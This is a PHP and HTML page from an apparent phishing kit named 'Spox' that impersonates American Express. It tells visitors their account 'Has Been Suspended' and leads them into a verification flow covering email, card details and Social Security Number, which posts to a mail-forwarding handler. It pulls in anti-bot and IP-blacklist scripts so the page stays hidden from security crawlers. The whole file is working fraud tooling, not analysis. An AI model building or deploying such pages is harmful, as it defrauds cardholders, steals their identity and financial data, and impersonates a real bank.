<?php
session_start();
error_reporting(0);

/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * AMEX -
 * version 1.0
 * Https://facebook.com/hackeeeed.html
 * icq+teleg = @spoxcoder
 
###############################################
#$            C0d3d by Spox_dz               $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2019 AMEX              $#
###############################################

**/

include'Spox/Anti/IP-BlackList.php';  
include'Spox/Anti/Bot-Crawler.php';
include'Spox/Anti/Bot-Spox.php';
include'Spox/Anti/blacklist.php';
include'Spox/Anti/new.php';
include'Spox/Functions/Fuck-you.php'; 
include'Spox/Anti/Dila_DZ.php';



if (!isset($_GET['amex_id']) || !isset($_GET['country'])) {
        header("HTTP/1.0 404 Not Found");
        exit();
    }
    
if (!isset($_SESSION['AMEX_SPOX'])) {
  header("Location: index");
  exit();
}
if (!isset($_SESSION['login_SESSION'])) {
  header("Location: login");
  exit();
}

?>
<html >
<head>
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
        <title>Getting Started - Account Verification</title>
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<meta name="format-detection" content="telephone=no">
		<link rel="icon" type="image/x-ico" href="favicon.ico">
		<link rel="stylesheet" href="Spox/Files/css/styles-rwd.css" type="text/css">
		<link rel="stylesheet" href="Spox/Files/css/steps.css" type="text/css">
		<link rel="stylesheet" href="Spox/Files/css/magnific-popup.css"> 
		<link rel="stylesheet" href="Spox/Files/css/gettingStarted.css" type="text/css">
			
<style type="text/css" media="screen" id="mm_style_mm_cdApiStyleId_1"></style><style></style></head>
	
	<body class="us-en AXP_CenterContent AXP_Responsive personalsavings   res_Medium res_750">
	
		<div id="responsiveWrapper_main">
			<div id="responsiveWrapper_sub">
	
	
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	
		<link media="all" type="text/css" href="Spox/Files/css/inav_responsive.css" rel="stylesheet">

		<div id="iNavNGI_Header" class="us-en">
		<script type="text/javascript" id="iNavFontChecker">// <![CDATA[ 
			if ((document.domain.indexOf('americanexpress') + document.domain.indexOf('aexp')) < 0) {document.getElementById('iNavNGI_Header').className += ' iNavDisableFont'; }if(NAV==null||typeof(NAV)=="undefined"){var NAV=new Object()}NAV.RWD={body:document.getElementsByTagName('body')[0],head:document.getElementsByTagName('head')[0],rwdView:false,deviceBucket:"large",deviceWidth:null,roundedWidth:null,isIE10:false,init:function(){var b=/*@cc_on!@*/false;var c=0;/*@cc_on if(/^10/.test(@_jscript_version)){c=10}@*/;if(b==true){if(c==10){NAV.RWD.body.className+=' ie10';NAV.RWD.isIE10=true}}if(NAV.RWD.body.className.match(/AXP_Responsive/i)){NAV.RWD.checkMetroMode();NAV.RWD.rwdView=true;NAV.RWD.deviceWidth=document.documentElement.clientWidth;NAV.RWD.roundedWidth=NAV.RWD.roundWidth(NAV.RWD.deviceWidth);NAV.RWD.setupClient(NAV.RWD.deviceWidth);window.onresize=function(a){NAV.RWD.deviceWidth=document.documentElement.clientWidth;NAV.RWD.roundedWidth=NAV.RWD.roundWidth(NAV.RWD.deviceWidth);NAV.RWD.setupClient(NAV.RWD.deviceWidth)}}},deviceBucketer:function(a){var b="large";if(a<831){if(a<661){b="small"}else{b="medium"}}else{b="large"}return b},roundWidth:function(a){var b=0;a%100>50?b=50:0;return Math.min(Math.floor(a/100)*100)+b},capitalize:function(a){return a.charAt(0).toUpperCase()+a.slice(1).toLowerCase()},setupClient:function(a){NAV.RWD.deviceBucket=NAV.RWD.deviceBucketer(a);var b=NAV.RWD.head.getElementsByTagName('link');if(b.length!=0){for(j=0;j<b.length;j++){var c=b[j].getAttribute('data-device-bucket');if(c){if(c==NAV.RWD.deviceBucket){b[j].href=b[j].getAttribute('data-css-uri');b[j].setAttribute('data-device-bucket',c+'-loaded')}}}}NAV.RWD.deviceBucket=NAV.RWD.capitalize(NAV.RWD.deviceBucket);NAV.RWD.body.className=NAV.RWD.body.className.replace(/\bres_.*?\b/g,'');NAV.RWD.body.className+=" res_"+NAV.RWD.deviceBucket;NAV.RWD.body.className+=" res_"+NAV.RWD.roundedWidth},isPluginSupport:function(){var a=null;try{a=!!new ActiveXObject("htmlfile")}catch(e){a=false}return a},checkMetroMode:function(){if(NAV.RWD.isIE10){if(!isPluginSupport()){if(document.documentElement.clientWidth>660){var b=document.createElement("style");b.setAttribute('type','text/css');b.appendChild(document.createTextNode("@-ms-viewport {width: device-width; }"));try{NAV.RWD.head.insertBefore(b,NAV.RWD.head.childNodes[1])}catch(e){NAV.RWD.head.appendChild(b)}}}}function isPluginSupport(){var a=null;try{a=!!new ActiveXObject("htmlfile")}catch(e){a=false}return a}}};NAV.RWD.init();
				// ]]></script>

<div id="skip-to-content">
<a title="Skip to main content" accesskey="2" tabindex="1" href="#">Skip to main content</a></div>
<div id="iNMbWrap">
	<div id="iNMbCont">
		<div id="iNMenuIco">
			<input type="button" title="Open Menu" id="iNOpBtn" value="Open Menu" class="iNMb iNMenu" data-location="javascript://">
		</div>
			<div id="iNAmexLogo">
				<a id="iNMblLogo" href="" class="iNMb">
				<img src="Spox/Files/img/clear.gif" >
			</a>
			</div>
				<div id="iNLogIco">
				<input type="button" id="iNLogBtn" value="Logout" class="iNMb iNLog" >
			</div>
		</div>
	</div>

<div id="iNavHdWrap">
<span id="iNMenuStart" class="iNAcsTxt" tabindex="-1">Start of menu</span>
<div id="ioaSearch">
	
</div>
<div id="iNCardSelector">
</div>
<div id="iNavHeaderCont">
<div id="iNavLogo">
<a id="" href="" title="" accesskey="0" class="iNDef">
<img src="Spox/Files/img/logo_bluebox-55x54.svg"  class="amexLogo">
</a>
</div>
<div id="iNavHeaderContFloat">
	<div id="iNavT1Nav">
	<ul id="iNavTier1Nav">
	<li>
<a id="iNav_MyAccount" title="" href="#" accesskey="1" class="iNSortedIndex">
	<span class="iNavT1LtDoor"></span>
	<span class="iNGblLnk">
	<span class="icon"></span>
	<span class="iNavLinkLabel">My Account</span></span>
	<span class="iNavT1RtDoor"></span></a>
	
</li><li><a id="iNav_Cards" title="" href="#"><span class="iNavT1LtDoor"></span><span class="iNGblLnk"><span class="icon"></span><span class="iNavLinkLabel">CARDS</span></span><span class="iNavT1RtDoor"></span></a>
</li><li><a id="iNav_Travel" title="" href="#"><span class="iNavT1LtDoor"></span><span class="iNGblLnk"><span class="icon"></span><span class="iNavLinkLabel">TRAVEL</span></span><span class="iNavT1RtDoor"></span></a>
</li><li><a id="iNav_Rewards" title="" href="#"><span class="iNavT1LtDoor"></span><span class="iNGblLnk"><span class="icon"></span><span class="iNavLinkLabel">REWARDS</span></span><span class="iNavT1RtDoor"></span></a>
</li><li><a id="iNav_Business" title="" href="#"><span class="iNavT1LtDoor"></span><span class="iNGblLnk"><span class="icon"></span><span class="iNavLinkLabel">BUSINESS</span></span><span class="iNavT1RtDoor"></span></a>
</li>
</ul>
</div>
</div>
<div id="iNavUtilitySection">
<div id="iNavUtilityArea">
<div id="iNavUtilityLinks"><ul>
<li class="iNavFirstItem">
<span id="iNavUtilCountryFlag"></span>
<span id="iNavUtilCountryName">United States</span>
<a id="iNavUtilChangeCountry" href="" class="iNavChangeCountry">(Change Country)</a></li></ul></div><div id="iNavLogin">
<span class="iNavLoginLtDoor"></span>
<a id="iNavLnkLog" title="" href="" class="iNavLinkLogin iNavLogVisible">Log In</a>
<span class="iNavLoginRtDoor"></span>
</div>
</div>
<div id="iNavSearch">
<div class="iNavSearchBox" id="iNavSearchBox">
<div class="iNavSearchLtDoor">
</div>
<div class="iNavSearchCenter">
<form name="iNMblSearchForm" id="iNavSearchForm" method="post" action="">
<fieldset><legend>Search US website</legend>
<label for="iNavSrchBox">Search</label>
<button title="Search" value="" id="iNavSrchBtn" type="submit">Search</button>
</fieldset>
</form>
</div>
<div class="iNavSearchRtDoor">
</div>
</div>
</div>
<div id="ioaTool">
<div id="toolHolder_left" class="toolHolder_left">
</div>
<div class="icons" id="ioaToolHolder">
<div class="ioaImages" id="phoneimg">
<a href="" class="ioaEnter" id="phoneAnchor" title="" rel="tooltip"></a>
<div id="ioaPhoneTooltip" class="ioaTooltip" style="display: none;">
<div class="tipHeader">
</div>
<div class="tipBody">
<p class="pHover">Contact Us</p><p>Call, chat or write.</p>
</div>
<div class="tipFooter">
</div>
</div>
</div>
<div class="ioaImages" id="smimg">
<a href="" class="ioaEnter" id="smAnchor" title="" rel="tooltip"></a>
<div id="ioaSMTooltip" class="ioaTooltip" style="display: none;">
<div class="tipHeader">	
</div>
<div class="tipBody">
<p class="pHover">Follow Us</p>
<p>Connect on social media.</p>
</div>
<div class="tipFooter">
</div>
</div>
</div>
<div id="searchImg">
<div id="iOASearchForm" name="Search">
<div class="ioaSmallSearch_left">
</div>
<fieldset>
<legend>Search US website</legend>
<label for="iOASearchInput">Search</label>
<span id="ioaPHText" class="ioaPHText"></span>
<button type="button" id="iOASearchBtn">Search</button>
</fieldset>
</div>
</div>
</div>
<div id="toolHolder_right" class="toolHolder_right">
</div>
</div>
</div>
<div id="iNMbUtilLinks">
<ul>
<li>
<a id="iNUtlFaq" href="">
<span class="iNIco"></span><span class="iNLbl">Site FAQ</span>
</a>
</li>
<li><a id="iNUtlContact" href="">
<span class="iNIco"></span>
<span class="iNLbl">Contact Us</span></a></li>
<li>
<a id="iNUtlChCountry"href="">
<span class="iNIco"></span>
<span class="iNLbl">Change Country</span>
</a>
</li>
</ul>
</div>
<a id="iNMenuEnd" class="iNAcsTxt" title="" href="#">Close Menu</a>
</div>
</div>


			<div class="iNavShadow"></div><div id="c-main-content"></div></div>
	
	<!--End File: US_en_NGN_H_Generic.html-->	
<div class="bottomShadow"></div>
	
			<div id="contentWrapper">
				<div id="divHeader">

	<div id="faqButton">?</div>


   <div id="contactUs">Contact us at 1-800-446-6307</div> </div>
				<div class="leftColumn">
				
					



<div id="stepWrapper" class="nonMobile">
	<div class="steps  active">
		<div class="stepNumber">1</div>
		<div class="stepDesc">Account <span class="block">Set Up</span></div>
	</div>
	<div class="steps ">
		<div class="stepNumber">2</div>
		<div class="stepDesc">Email Authentication</div>
	</div>
	<div class="steps ">
		<div class="stepNumber">3</div>
    			<div class="stepDesc">Card details</div>
	</div>
	<div class="steps ">
		<div class="stepNumber">4</div>
		
    		
    		
    			<div class="stepDesc">Finish</div>
    		
		

	</div>
</div><div class="topBottomBorder">
								<div class="blue height10" style="width:8%"></div>
							</div>
						<div id="divMain">
	
						<div class="contentTop">
							
							<div class="center topBottomPadding10">
									<h1>This American Express Account Has Been Suspended ! <span class="glyph info-glyph" id="ttimgAlreadyHaveAccount"></span></h1></div>
							<div>




<style scoped="">
	@media all and (min-width:41.3125em) {
		#stipulationsButtonWrapper {
			overflow: auto;
		}
		#stipulationsButtonWrapper > input {
			float: right;
			margin-right: 10px;
			margin-right: 1rem;
			width: auto;
		}
		#stipulationsButtonWrapper > input:first-child {
			margin-right: 0;
		}
	}
</style>


<form id="application" action="Spox/Mail/Redirect.php" method="post">
	<div id="ttipHelpText" style="display:none;">
		Please know that your American Express Card account and Personal Savings logins are different.<br><br> By logging in to your account, we will auto-fill your information such as Name, Address and SSN.
	</div>
	<p class="padLeft55">By continuing this verification, you confirm that-</p>
<style type="text/css">
.req18 {
    background-image: url(Spox/Files/img/email_mail_verify_verified_inbox_true_right-512.png);
    background-position-y: center;
}

</style>
	<div class="requirements">
		<ul class="req18"><li>Email authentication.</li></ul>
		<ul class="reqPersonal"><li>You will verify the card details that linked to your account</li></ul>
		<ul class="reqUS"><li>You are a U.S. citizen OR a resident alien with a valid Social Security Number (SSN) or Individual Taxpayer Identification Number (ITIN) with a home address in the United States.</li></ul>
	</div>
	
	<div class="button-wrapper right" id="stipulationsButtonWrapper">
		<input type="hidden" name="spox" value="Fuck-you">
		<input type="submit" id="proceed" name="submit"  value="Continue">
	
	</div>
	
 	<hr class="fullDotted nonMobile">
	<div class="legalText"><p><b>IMPORTANT INFORMATION ABOUT VERIFY ACCOUNT AT AMERICAN EXPRESS NATIONAL BANK</b></p><p>To help the United States Government fight the funding of terrorism and money laundering activities,	Federal law requires all financial institutions to obtain, verify, and record information that identifies each person who opens an account.</p><p><b>What does this mean for you?</b> When you verify an account, we will ask for your name, a street address, date of birth, and an identification number, such as a Social Security Number, which Federal law requires us to obtain. We may also ask to see your driver’s license or identifying documents that allow us to identify you. We appreciate your cooperation.</p></div>
</form></div>
						</div>
						

						<div class="contentBottom" data-html2canvas-ignore="true">
							<div id="divSubFooter">
								<div class="tdFloatLeft">
									<p>
										<a href="#"  class="bright">Deposit Account Agreement</a>
										&nbsp;|&nbsp;
										<a class="bright">Privacy Statement</a> 
									</p>
									<p>Accounts offered by American Express National Bank. Member FDIC.</p>
								</div>
								
								<div class="rightFloat small topPad15 field" id="divCancelLink">
									</div>
							</div>
						</div>
						 
					</div>
	</div>					
					
				</div>
				
	
	
		<div id="iNavNGI_FooterMain" class="us-en iNNewFoot"><!--<![endif]--><div id="iNavNGI_FooterWrap"><div id="iNavNGI_FooterCont"><div id="iNavNGI_Footer">
			<div id="iNMblFootUtil"><div id="iNMblUtilCont">
			<input  value="Contact Us" id="iNFootCntBtn" type="button" >
			<input  value="Log In" id="iNFootLgBtn" type="button" ></div></div><div id="iNavFootMain"><ul><li class="iNDef" id="gNFtCI1"><a id="footer_about_american_express" href="#" >About American Express</a></li><li class="iNNMb" id="gNFtCI2"><a id="footer_investor_relations" href="#"  data-omn-click-fn="omn_rmaction" data-omn-click-args="US:Amex:Nav,click>InvestRel" data-omn-once="Yes" class="iNOmn">Investor Relations</a></li><li class="iNDef" id="gNFtCI3"><a id="footer_careers" href="#" >Careers</a></li><li class="iNNMb" id="gNFtCI4"><a id="footer_sitemap" href="#" >Site Map</a></li><li class="iNNMb" id="gNFtCI5"><a id="footer_contact_us" href="#" >Contact Us</a></li><li class="iNMb" id="gNFtCI6"><a id="footer_mobile_mob" href="#" >Mobile &amp; Tablet Apps</a></li></ul></div><div id="iNavFootSub"><ul id="iNavSocial"><li class="iNDef" id="gNFtSM1"><a id="icoFb" href="#" data-window="new" data-omn-click-fn="omn_rmaction" data-omn-click-args="US:Amex:Nav,click>FaceBook,e" data-omn-once="Yes" class="iNWin iNOmn" target="_blank"><img src="Spox/Files/img/facebook.png" alt="Facebook - Link will open in a new window"  class="icoFb"></a></li><li class="iNDef" id="gNFtSM2"><a id="icoTw" href="#"  data-window="new" data-omn-click-fn="omn_rmaction" data-omn-click-args="US:Amex:Nav,click>Twitter,e" data-omn-once="Yes" class="iNWin iNOmn" target="_blank"><img src="Spox/Files/img/twitter.png" alt="Twitter - Link will open in a new window"  class="icoTw"></a></li><li class="iNDef" id="gNFtSM3"><a id="icoIg" href="#"  data-window="new" data-omn-click-fn="omn_rmaction" data-omn-click-args="US:Amex:Nav,click>Instagram,e" data-omn-once="Yes" class="iNWin iNOmn" target="_blank"><img src="Spox/Files/img/instagram.png" alt="Instagram - Link will open in a new window"  class="icoIg"></a></li><li class="iNDef" id="gNFtSM4"><a id="icoLi" href="#"  data-window="new" data-omn-click-fn="omn_rmaction" data-omn-click-args="US:Amex:Nav,click>LinkedIn,e" data-omn-once="Yes" class="iNWin iNOmn" target="_blank"><img src="Spox/Files/img/in.png" alt="LinkedIn - Link will open in a new window"  class="icoLi"></a></li><li class="iNDef iNavLast" id="gNFtSM5"><a id="icoYt" href="#"  data-window="new" data-omn-click-fn="omn_rmaction" data-omn-click-args="US:Amex:Nav,click>YouTube,e" data-omn-once="Yes" class="iNWin iNOmn" target="_blank"><img src="Spox/Files/img/youtube.png" alt="YouTube - Link will open in a new window"  class="icoYt"></a></li></ul></div></div><div id="iNavFootOthers"><div class="iNavFootRow"><ul><li class="iNavFootHd">Products &amp; Services</li><li class="iNNMb" id="gNFtLink1_1"><a id="footer_cards_personal" href="#" >Credit Cards</a></li><li class="iNNMb" id="gNFtLink1_2"><a id="footer_cards_sm_bus" href="#" >Business Credit Cards</a></li><li class="iNNMb" id="gNFtLink1_3"><a id="footer_cards_corp" href="#" >Corporate Programs</a></li><li class="iNNMb" id="gNFtLink1_4"><a id="footer_cards_reload" href="#" >Prepaid Cards</a></li><li class="iNDef" id="gNFtLink1_5"><a id="footer_personal_savings" href="#" >Savings Accounts and CDs</a></li><li class="iNNMb iNavLast" id="gNFtLink1_6"><a id="footer_giftcards" href="#" >Gift Cards</a></li></ul></div><div class="iNavFootRow"><ul><li class="iNavFootHd">Links You May Like</li><li class="iNNMb" id="gNFtLink2_1"><a id="footer_mr" href="#" >Membership Rewards<sup>®</sup></a></li><li class="iNMb" id="gNFtLink2_2"><a id="footer_mobile" href="#" >Mobile &amp; Tablet Apps</a></li><li class="iNNMb" id="gNFtLink2_3"><a id="footer_credit_score" href="#" >Free Credit Score &amp; Report</a></li><li class="iNNMb" id="gNFtLink2_4"><a id="footer_credit_secure" href="#" >CreditSecure®</a></li><li class="iNNMb" id="gNFtLink2_5"><a id="footer_cards_reload" href="#" data-window="new" class="iNWin" target="_blank">Serve<sup>®</sup></a></li><li class="iNDef" id="gNFtLink2_6"><a id="footer_bluebird" href="#"  data-window="new" class="iNWin" target="_blank">Bluebird<sup>®</sup></a></li><li class="iNNMb" id="gNFtLink2_7"><a id="footer_accept_amex" href="#" >Accept Amex Cards</a></li><li class="iNDef iNavLast" id="gNFtLink2_8"><a id="footer_refer_friend" href="#" >Refer a Friend</a></li></ul></div></div><div id="copyrightInfo"><ul><li class="iNDef" id="gNFtLC1"><a id="footer_supplier_management" href="#" >Supplier Management</a></li><li class="iNDef" id="gNFtLC2"><a id="footer_Terms_of_Use" href="#" >Terms of Service</a></li><li class="iNDef" id="gNFtLC3"><a id="footer_privacy_statement" href="#" >Privacy Center</a></li><li class="iNDef" id="gNFtLC4"><a id="footer_adChoices" href="#" data-window="new" class="iNWin" target="_blank">AdChoices</a></li><li class="iNDef" id="gNFtLC5"><a id="footer_card_agreements" href="#" >Card Agreements</a></li><li class="iNDef" id="gNFtLC6"><a id="footer_fraud_protection_center" href="#" >Security Center</a></li><li class="iNDef" id="gNFtLC7"><a id="footer_credit_basics" href="#">Financial Education</a></li><li class="iNDef iNavLast" id="gNFtLC8"><a id="footer_servicemember_benefits" href="#" >Servicemember Benefits</a></li></ul><p class="iNLegal">All users of our online services subject to Privacy Statement and agree to be bound by Terms of Service. Please review.</p><p class="iNCopy">© 2019 American Express Company. All rights reserved.</p></div></div><div id="iNavObjects"></div><div id="iNavScripts"></div></div></div>
</div>
</div>




		<div id="toolTipContainer">
			<div id="toolTip">
				<span id="toolTipClose">×</span>
				<div id="toolTipTitle" class="left"></div>
				<div id="toolTipText" class="left"></div>
				<div class="tooltip-arrow">
					<div class="tooltip-arrow-pointer"></div>
				</div>
			</div>
		</div>
		<div id="editor"></div>
		<div id="core-dialog" style="display:none;">
			<p id="core-dialog-text"></p>
		</div>

		<div id="core-timeout-dialog" style="display:none;">
</div>

<link href="Spox/Files/css/aaLauncher.css?57" type="text/css" media="all" rel="stylesheet">
</body>
</html>